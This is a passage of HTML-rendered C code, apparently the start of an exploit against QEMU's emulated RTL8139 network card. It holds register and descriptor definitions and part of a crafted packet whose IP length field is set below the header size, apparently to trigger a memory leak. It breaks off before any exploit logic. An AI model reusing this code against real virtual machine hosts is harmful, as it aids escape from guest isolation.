</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
</span><span class=lnt>280
</span><span class=lnt>281
</span><span class=lnt>282
</span><span class=lnt>283
</span><span class=lnt>284
</span><span class=lnt>285
</span><span class=lnt>286
</span><span class=lnt>287
</span><span class=lnt>288
</span><span class=lnt>289
</span><span class=lnt>290
</span><span class=lnt>291
</span><span class=lnt>292
</span><span class=lnt>293
</span><span class=lnt>294
</span><span class=lnt>295
</span><span class=lnt>296
</span><span class=lnt>297
</span><span class=lnt>298
</span><span class=lnt>299
</span><span class=lnt>300
</span><span class=lnt>301
</span><span class=lnt>302
</span><span class=lnt>303
</span><span class=lnt>304
</span><span class=lnt>305
</span><span class=lnt>306
</span><span class=lnt>307
</span><span class=lnt>308
</span><span class=lnt>309
</span><span class=lnt>310
</span><span class=lnt>311
</span><span class=lnt>312
</span><span class=lnt>313
</span><span class=lnt>314
</span><span class=lnt>315
</span><span class=lnt>316
</span><span class=lnt>317
</span><span class=lnt>318
</span><span class=lnt>319
</span><span class=lnt>320
</span><span class=lnt>321
</span><span class=lnt>322
</span><span class=lnt>323
</span><span class=lnt>324
</span><span class=lnt>325
</span><span class=lnt>326
</span><span class=lnt>327
</span><span class=lnt>328
</span><span class=lnt>329
</span><span class=lnt>330
</span><span class=lnt>331
</span><span class=lnt>332
</span><span class=lnt>333
</span><span class=lnt>334
</span><span class=lnt>335
</span><span class=lnt>336
</span><span class=lnt>337
</span><span class=lnt>338
</span><span class=lnt>339
</span><span class=lnt>340
</span><span class=lnt>341
</span><span class=lnt>342
</span><span class=lnt>343
</span><span class=lnt>344
</span><span class=lnt>345
</span><span class=lnt>346
</span><span class=lnt>347
</span><span class=lnt>348
</span><span class=lnt>349
</span><span class=lnt>350
</span><span class=lnt>351
</span><span class=lnt>352
</span><span class=lnt>353
</span><span class=lnt>354
</span><span class=lnt>355
</span><span class=lnt>356
</span><span class=lnt>357
</span><span class=lnt>358
</span><span class=lnt>359
</span><span class=lnt>360
</span><span class=lnt>361
</span><span class=lnt>362
</span><span class=lnt>363
</span><span class=lnt>364
</span><span class=lnt>365
</span><span class=lnt>366
</span><span class=lnt>367
</span><span class=lnt>368
</span><span class=lnt>369
</span><span class=lnt>370
</span><span class=lnt>371
</span><span class=lnt>372
</span><span class=lnt>373
</span><span class=lnt>374
</span><span class=lnt>375
</span><span class=lnt>376
</span><span class=lnt>377
</span><span class=lnt>378
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/io.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=c1>// 页面相关
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#define PAGE_SHIFT 12
</span></span></span><span class=line><span class=cl><span class=cp>#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)
</span></span></span><span class=line><span class=cl><span class=cp>#define PAGE_PRESENT (1ULL &lt;&lt; 63)
</span></span></span><span class=line><span class=cl><span class=cp>#define PAGE_PFN ((1ULL &lt;&lt; 55) - 1)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=c1>// RTL8139 PMIO base address
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#define PMIO_BASE 0xC000
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=c1>// Ethernet Frame
</span></span></span><span class=line><span class=cl><span class=c1>// DST(6) + SRC(6) + Length/Type(2) + MTU(1500)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#define RTL8139_BUFFER_SIZE 1514
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* w0 ownership flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_RX_OWN (1&lt;&lt;31)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* w0 ownership flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_OWN (1&lt;&lt;31)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* w0 end of ring flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_EOR (1&lt;&lt;30)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* first segment of received packet flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_FS (1&lt;&lt;29)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* last segment of received packet flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_LS (1&lt;&lt;28)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* large send packet flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_LGSEN (1&lt;&lt;27)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* large send MSS mask, bits 16...25 */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TC_LGSEN_MSS_MASK ((1 &lt;&lt; 12) - 1)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* IP checksum offload flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_IPCS (1&lt;&lt;18)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* UDP checksum offload flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_UDPCS (1&lt;&lt;17)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* TCP checksum offload flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_TCPCS (1&lt;&lt;16)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* w0 bits 0...15 : buffer size */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_BUFFER_SIZE (1&lt;&lt;16)
</span></span></span><span class=line><span class=cl><span class=cp>#define CP_TX_BUFFER_SIZE_MASK (CP_TX_BUFFER_SIZE - 1)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* w1 add tag flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_TAGC (1&lt;&lt;17)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* w1 bits 0...15 : VLAN tag (big endian) */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_VLAN_TAG_MASK ((1&lt;&lt;16) - 1)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* w2 low  32bit of Rx buffer ptr */</span>
</span></span><span class=line><span class=cl><span class=cm>/* w3 high 32bit of Rx buffer ptr */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* set after transmission */</span>
</span></span><span class=line><span class=cl><span class=cm>/* FIFO underrun flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_STATUS_UNF (1&lt;&lt;25)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* transmit error summary flag, valid if set any of three below */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_STATUS_TES (1&lt;&lt;23)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* out-of-window collision flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_STATUS_OWC (1&lt;&lt;22)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* link failure flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_STATUS_LNKF (1&lt;&lt;21)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* excessive collisions flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_STATUS_EXC (1&lt;&lt;20)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* Symbolic offsets to registers. */</span>
</span></span><span class=line><span class=cl><span class=k>enum</span> <span class=n>RTL8139_registers</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>MAC0</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span>        <span class=cm>/* Ethernet hardware address. */</span>
</span></span><span class=line><span class=cl>    <span class=n>MAR0</span> <span class=o>=</span> <span class=mi>8</span><span class=p>,</span>        <span class=cm>/* Multicast filter. */</span>
</span></span><span class=line><span class=cl>    <span class=n>TxStatus0</span> <span class=o>=</span> <span class=mh>0x10</span><span class=p>,</span><span class=cm>/* Transmit status (Four 32bit registers). C mode only */</span>
</span></span><span class=line><span class=cl>                     <span class=cm>/* Dump Tally Conter control register(64bit). C+ mode only */</span>
</span></span><span class=line><span class=cl>    <span class=n>TxAddr0</span> <span class=o>=</span> <span class=mh>0x20</span><span class=p>,</span>  <span class=cm>/* Tx descriptors (also four 32bit). */</span>
</span></span><span class=line><span class=cl>    <span class=n>RxBuf</span> <span class=o>=</span> <span class=mh>0x30</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>ChipCmd</span> <span class=o>=</span> <span class=mh>0x37</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>RxBufPtr</span> <span class=o>=</span> <span class=mh>0x38</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>RxBufAddr</span> <span class=o>=</span> <span class=mh>0x3A</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>IntrMask</span> <span class=o>=</span> <span class=mh>0x3C</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>IntrStatus</span> <span class=o>=</span> <span class=mh>0x3E</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>TxConfig</span> <span class=o>=</span> <span class=mh>0x40</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>RxConfig</span> <span class=o>=</span> <span class=mh>0x44</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>Timer</span> <span class=o>=</span> <span class=mh>0x48</span><span class=p>,</span>        <span class=cm>/* A general-purpose counter. */</span>
</span></span><span class=line><span class=cl>    <span class=n>RxMissed</span> <span class=o>=</span> <span class=mh>0x4C</span><span class=p>,</span>    <span class=cm>/* 24 bits valid, write clears. */</span>
</span></span><span class=line><span class=cl>    <span class=n>Cfg9346</span> <span class=o>=</span> <span class=mh>0x50</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>Config0</span> <span class=o>=</span> <span class=mh>0x51</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>Config1</span> <span class=o>=</span> <span class=mh>0x52</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>FlashReg</span> <span class=o>=</span> <span class=mh>0x54</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>MediaStatus</span> <span class=o>=</span> <span class=mh>0x58</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>Config3</span> <span class=o>=</span> <span class=mh>0x59</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>Config4</span> <span class=o>=</span> <span class=mh>0x5A</span><span class=p>,</span>        <span class=cm>/* absent on RTL-8139A */</span>
</span></span><span class=line><span class=cl>    <span class=n>HltClk</span> <span class=o>=</span> <span class=mh>0x5B</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>MultiIntr</span> <span class=o>=</span> <span class=mh>0x5C</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PCIRevisionID</span> <span class=o>=</span> <span class=mh>0x5E</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>TxSummary</span> <span class=o>=</span> <span class=mh>0x60</span><span class=p>,</span> <span class=cm>/* TSAD register. Transmit Status of All Descriptors*/</span>
</span></span><span class=line><span class=cl>    <span class=n>BasicModeCtrl</span> <span class=o>=</span> <span class=mh>0x62</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>BasicModeStatus</span> <span class=o>=</span> <span class=mh>0x64</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>NWayAdvert</span> <span class=o>=</span> <span class=mh>0x66</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>NWayLPAR</span> <span class=o>=</span> <span class=mh>0x68</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>NWayExpansion</span> <span class=o>=</span> <span class=mh>0x6A</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* Undocumented registers, but required for proper operation. */</span>
</span></span><span class=line><span class=cl>    <span class=n>FIFOTMS</span> <span class=o>=</span> <span class=mh>0x70</span><span class=p>,</span>        <span class=cm>/* FIFO Control and test. */</span>
</span></span><span class=line><span class=cl>    <span class=n>CSCR</span> <span class=o>=</span> <span class=mh>0x74</span><span class=p>,</span>        <span class=cm>/* Chip Status and Configuration Register. */</span>
</span></span><span class=line><span class=cl>    <span class=n>PARA78</span> <span class=o>=</span> <span class=mh>0x78</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PARA7c</span> <span class=o>=</span> <span class=mh>0x7c</span><span class=p>,</span>        <span class=cm>/* Magic transceiver parameter register. */</span>
</span></span><span class=line><span class=cl>    <span class=n>Config5</span> <span class=o>=</span> <span class=mh>0xD8</span><span class=p>,</span>        <span class=cm>/* absent on RTL-8139A */</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* C+ mode */</span>
</span></span><span class=line><span class=cl>    <span class=n>TxPoll</span>        <span class=o>=</span> <span class=mh>0xD9</span><span class=p>,</span>    <span class=cm>/* Tell chip to check Tx descriptors for work */</span>
</span></span><span class=line><span class=cl>    <span class=n>RxMaxSize</span>    <span class=o>=</span> <span class=mh>0xDA</span><span class=p>,</span> <span class=cm>/* Max size of an Rx packet (8169 only) */</span>
</span></span><span class=line><span class=cl>    <span class=n>CpCmd</span>        <span class=o>=</span> <span class=mh>0xE0</span><span class=p>,</span> <span class=cm>/* C+ Command register (C+ mode only) */</span>
</span></span><span class=line><span class=cl>    <span class=n>IntrMitigate</span>    <span class=o>=</span> <span class=mh>0xE2</span><span class=p>,</span>    <span class=cm>/* rx/tx interrupt mitigation control */</span>
</span></span><span class=line><span class=cl>    <span class=n>RxRingAddrLO</span>    <span class=o>=</span> <span class=mh>0xE4</span><span class=p>,</span> <span class=cm>/* 64-bit start addr of Rx ring */</span>
</span></span><span class=line><span class=cl>    <span class=n>RxRingAddrHI</span>    <span class=o>=</span> <span class=mh>0xE8</span><span class=p>,</span> <span class=cm>/* 64-bit start addr of Rx ring */</span>
</span></span><span class=line><span class=cl>    <span class=n>TxThresh</span>    <span class=o>=</span> <span class=mh>0xEC</span><span class=p>,</span> <span class=cm>/* Early Tx threshold */</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* Bits in TxConfig. */</span>
</span></span><span class=line><span class=cl><span class=k>enum</span> <span class=n>tx_config_bits</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=cm>/* Interframe Gap Time. Only TxIFG96 doesn&#39;t violate IEEE 802.3 */</span>
</span></span><span class=line><span class=cl>        <span class=n>TxIFGShift</span> <span class=o>=</span> <span class=mi>24</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>TxIFG84</span> <span class=o>=</span> <span class=p>(</span><span class=mi>0</span> <span class=o>&lt;&lt;</span> <span class=n>TxIFGShift</span><span class=p>),</span>    <span class=cm>/* 8.4us / 840ns (10 / 100Mbps) */</span>
</span></span><span class=line><span class=cl>        <span class=n>TxIFG88</span> <span class=o>=</span> <span class=p>(</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=n>TxIFGShift</span><span class=p>),</span>    <span class=cm>/* 8.8us / 880ns (10 / 100Mbps) */</span>
</span></span><span class=line><span class=cl>        <span class=n>TxIFG92</span> <span class=o>=</span> <span class=p>(</span><span class=mi>2</span> <span class=o>&lt;&lt;</span> <span class=n>TxIFGShift</span><span class=p>),</span>    <span class=cm>/* 9.2us / 920ns (10 / 100Mbps) */</span>
</span></span><span class=line><span class=cl>        <span class=n>TxIFG96</span> <span class=o>=</span> <span class=p>(</span><span class=mi>3</span> <span class=o>&lt;&lt;</span> <span class=n>TxIFGShift</span><span class=p>),</span>    <span class=cm>/* 9.6us / 960ns (10 / 100Mbps) */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>TxLoopBack</span> <span class=o>=</span> <span class=p>(</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=mi>18</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=mi>17</span><span class=p>),</span> <span class=cm>/* enable loopback test mode */</span>
</span></span><span class=line><span class=cl>    <span class=n>TxCRC</span> <span class=o>=</span> <span class=p>(</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>),</span>    <span class=cm>/* DISABLE appending CRC to end of Tx packets */</span>
</span></span><span class=line><span class=cl>    <span class=n>TxClearAbt</span> <span class=o>=</span> <span class=p>(</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=mi>0</span><span class=p>),</span>    <span class=cm>/* Clear abort (WO) */</span>
</span></span><span class=line><span class=cl>    <span class=n>TxDMAShift</span> <span class=o>=</span> <span class=mi>8</span><span class=p>,</span>        <span class=cm>/* DMA burst value (0-7) is shifted this many bits */</span>
</span></span><span class=line><span class=cl>    <span class=n>TxRetryShift</span> <span class=o>=</span> <span class=mi>4</span><span class=p>,</span>    <span class=cm>/* TXRR value (0-15) is shifted this many bits */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>TxVersionMask</span> <span class=o>=</span> <span class=mh>0x7C800000</span><span class=p>,</span> <span class=cm>/* mask out version bits 30-26, 23 */</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* Bits in RxConfig. */</span>
</span></span><span class=line><span class=cl><span class=k>enum</span> <span class=n>rx_mode_bits</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>AcceptErr</span> <span class=o>=</span> <span class=mh>0x20</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>AcceptRunt</span> <span class=o>=</span> <span class=mh>0x10</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>AcceptBroadcast</span> <span class=o>=</span> <span class=mh>0x08</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>AcceptMulticast</span> <span class=o>=</span> <span class=mh>0x04</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>AcceptMyPhys</span> <span class=o>=</span> <span class=mh>0x02</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>AcceptAllPhys</span> <span class=o>=</span> <span class=mh>0x01</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>enum</span> <span class=n>ChipCmdBits</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>CmdReset</span> <span class=o>=</span> <span class=mh>0x10</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>CmdRxEnb</span> <span class=o>=</span> <span class=mh>0x08</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>CmdTxEnb</span> <span class=o>=</span> <span class=mh>0x04</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>RxBufEmpty</span> <span class=o>=</span> <span class=mh>0x01</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* C+ mode */</span>
</span></span><span class=line><span class=cl><span class=k>enum</span> <span class=n>CplusCmdBits</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>CPlusRxVLAN</span>   <span class=o>=</span> <span class=mh>0x0040</span><span class=p>,</span> <span class=cm>/* enable receive VLAN detagging */</span>
</span></span><span class=line><span class=cl>    <span class=n>CPlusRxChkSum</span> <span class=o>=</span> <span class=mh>0x0020</span><span class=p>,</span> <span class=cm>/* enable receive checksum offloading */</span>
</span></span><span class=line><span class=cl>    <span class=n>CPlusRxEnb</span>    <span class=o>=</span> <span class=mh>0x0002</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>CPlusTxEnb</span>    <span class=o>=</span> <span class=mh>0x0001</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// big endian
</span></span></span><span class=line><span class=cl><span class=c1>// ethernet frame
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>uint8_t</span> <span class=n>packet</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* 以太网帧 */</span>
</span></span><span class=line><span class=cl>    <span class=c1>// dst
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x52</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x57</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// src
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x52</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x57</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 类型(代表IP协议)
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x08</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=cm>/* IP数据报 */</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 版本和首部长度
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>(</span><span class=mh>0x4</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>|</span> <span class=mh>0x5</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// TOS
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x00</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 总长度
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x13</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 标识
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0xde</span><span class=p>,</span> <span class=mh>0xad</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 标志(3bit)和片偏移(以8为基本单位，也就是相当于把标志的3bit当做0来计算)
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// TTL
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x40</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 上层协议，代表TCP
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x06</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 首部校验和
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0xde</span><span class=p>,</span> <span class=mh>0xad</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 源IP
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x7f</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 目的IP
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x7f</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/* TCP数据报 */</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 源端口
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0xde</span><span class=p>,</span> <span class=mh>0xad</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 目的端口
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0xbe</span><span class=p>,</span> <span class=mh>0xef</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Sequence Number
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Acknowledgement Number
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 报头长度等
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x50</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x10</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Window size
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0xde</span><span class=p>,</span> <span class=mh>0xed</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// TCP checksum
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0xde</span><span class=p>,</span> <span class=mh>0xad</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Urgent pointer
